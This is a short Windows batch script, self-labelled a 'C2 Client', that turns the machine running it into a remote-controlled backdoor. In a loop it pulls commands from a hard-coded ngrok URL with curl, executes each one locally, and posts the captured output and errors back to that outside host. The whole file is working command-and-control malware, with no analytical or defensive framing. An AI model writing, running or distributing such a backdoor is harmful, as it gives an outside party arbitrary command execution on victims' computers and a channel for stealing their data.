@echo off
set URL=https://noneconomical-trisha-waitingly.ngrok-free.dev

echo [*] Starting C2 Client
echo [*] URL: %URL%

:loop
    ping -n 2 127.0.0.1 >nul
    
    rem Get command from server
    for /f "usebackq delims=" %%A in (`curl -s %URL% 2^>nul`) do set CMD=%%A
    
    if "%CMD%"=="" goto loop
    
    echo [*] Executing: %CMD%
    
    rem Execute command and capture ALL output including errors
    for /f "delims=" %%O in ('%CMD% 2^>^&1') do (
        echo [*] Output: %%O
        curl -X POST -d "%%O" %URL% 2>nul
    )
    
    goto loop
